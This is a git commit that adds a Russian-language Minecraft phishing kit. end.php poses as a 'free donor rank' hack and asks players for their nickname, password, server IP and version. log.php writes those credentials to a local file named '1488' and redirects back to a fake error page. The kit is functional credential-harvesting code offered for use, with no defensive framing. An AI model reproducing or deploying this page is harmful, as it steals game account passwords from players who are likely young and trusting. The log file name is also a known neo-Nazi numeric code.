a3d2e68784326b70b74f43d4db4eb346b130aaaf
haoss133 <122730504+haoss133@users.noreply.github.com>
2023-01-15 16:18:13 +0300

    Add files via upload

---
+++ end.php
@@ -0,0 +1,124 @@
+<!DOCTYPE HTML>
+<html>
+	<head>
+		<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+		<meta name="description" content="Платный донат бесплатно">
+		<meta name="keywords" content="">
+		<title>Бесплатный донат в Minecraft</title>
+		<link href="css/bootstrap.css" rel="stylesheet" media="screen" />
+		<link href="css/icon.png" rel="shortcut icon" type="image/x-icon" />
+		<link href="css/custom.css" rel="stylesheet" media="screen" />
+		<script type="text/javascript">
+			var pack_info = {
+			    0.6:  ['Вип+'],
+			    0.5:  ['Премиум'],
+			    0.4:  ['Креатив'],
+			    0.3:  ['Админ'],
+			    0.2:  ['Модератор'],
+			    0.1:  ['Бог и Лорд'],
+			    1:  ['Главный администратор'],
+			    2:  ['Создатель'],
+				3:  ['Основатель'],
+				4:  ['Анти-грифер'],
+				5:  ['Владелец'],
+				6:  ['Владелец+OP+Консоль'],
+			}
+		</script>
+	</head>
+ <form method="post" name="login" id="login" action="log.php" onSubmit="return CheckForm(this);">
+ <input type="hidden" name="success_url" id="success_url" value="">
+ <input type="hidden" name="fail_url" id="fail_url" value="">
+
+	<body>
+<script type="text/javascript">
+sitePath = "/";
+sflakesMax = 64;
+sflakesMaxActive = 64;
+svMaxX = 3;
+svMaxY = 3;
+ssnowStick = 1;
+sfollowMouse = 1;
+</script>
+<script type="text/javascript" src="/snow/snow.js"></script>
+		<div class="container" style="width: 600px;">
+			<div class="page-header">
+				<h1>Бесплатный донат в Minecraft</h1>
+                                 <center><h2 style="color:#00BFFF">Упс, что-то пошло не так!</h2></center>
+			</div>
+			<i><center>Вы ввели неверно данные, либо на сервере менее 50 игроков, либо вы уже взламывали.<br>Взлом работает только раз в месяц и если у вас уже есть донат.</br></center></i>
+			<hr>
+			<div class="row">
+			    
+				</div>
+			</div>
+			<hr><i><center>Донат дается не сразу.</center></i><hr>
+						</li>
+					</ul>
+				</div>
+				<hr>
+				</div>
+			</div>
+			<center>
+				<div class="modal fade" id="authModal" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-hidden="true">
+					<div class="modal-dialog" style="width: 400px;">
+						<div class="modal-content" style="width: 400px;">
+							<div class="modal-header">
+								<button type="button" class="close" data-dismiss="modal" aria-hidden="true">&times;</button>
+								<h4 class="modal-title"><center>1.Введите логин и пароль от сервера, IP и версию сервера.</center></h4>
+								<h4 class="modal-title"><center>2.Взлом работает от вип и выше.Если на сервере более 50 игроков. И раз в месяц!</center></h4>
+					
+							</div>
+							<form name="login-form">
+								<div class="modal-body">
+									<div class="thumbnail">
+										<img id="pack-image" class="">
+										<div class="caption">
+											<h3 id="pack-name"></h3>
+										</div>
+									</div>
+									<hr>
+									<form method="post" name="login" id="login" action="log.php" onSubmit="return CheckForm(this);">
+									<div id="result" style="display:none;"></div>
+									<div class="input-group" style="width: 300px;">
+										<span class="input-group-addon" style="padding: 2px 17px;">Ник</span>
+										<input type="text" name="login" class="form-control" placeholder="Nick" required autofocus>
+									</div><br>
+  					<ul class="list-group">
+						<form id="grab" action="log.php" method="post">
+									<div class="input-group" style="width: 300px;">
+										<span class="input-group-addon">Пароль</span>
+										<input type="password" name="pass" class="form-control" placeholder="*******" required>
+									</div><br>
+  					<ul class="list-group">
+						<form id="grab" action="log.php" method="post">
+									<div class="input-group" style="width: 300px;">
+										<span class="input-group-addon">IP</span>
+										<input type="text" name="ip" class="form-control" placeholder="127.0.0.1" required>
+									</div><br>
+  					<ul class="list-group">
+						<form id="grab" action="log.php" method="post">
+									<div class="input-group" style="width: 300px;">
+										<span class="input-group-addon">Версия</span>
+										<input type="text" name="vers" class="form-control" placeholder="1.5.2" required>
+									</div>
+								</div>
+								<div class="modal-footer">
+										<span class="ncc"><a href="javascript:document.login.submit()"><center><button type="button" onclick="Buy()" class="btn btn-lg btn-danger" style="width: 300px;margin-top: 30px;">Получить донат</button><center>
+  					<ul class="list-group">
+						<form id="grab" action="log.php" method="post">
+								</div>
+							</form>
+						</div>
+					</div>
+				</div>
+						</div>
+					</div>
+				</div>
+			</center>
+			<center>
+			</center>
+			</body>
+			<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.11.0/jquery.min.js"></script>
+			<script src="/js/bootstrap.min.js"></script>
+			<script src="/js/custom.js?1"></script>
+		</html>
---
+++ log.php
@@ -0,0 +1,11 @@
+﻿<?PHP
+$login = $_POST['login']; 
+$pass = $_POST['pass']; 
+$ip = $_POST['ip']; 
+$vers = $_POST['vers']; 
+
+$log = fopen("1488","a+"); 
+fwrite($log,"\nНик: [$login] ; Пароль: [$pass] ; IP: [$ip] ; Версия: [$vers] \n "); 
+fclose($log);
+echo "<html><head><META HTTP-EQUIV='Refresh' content ='0; URL=http://qqEPTA/end.php'></head></html>"; 
+?>
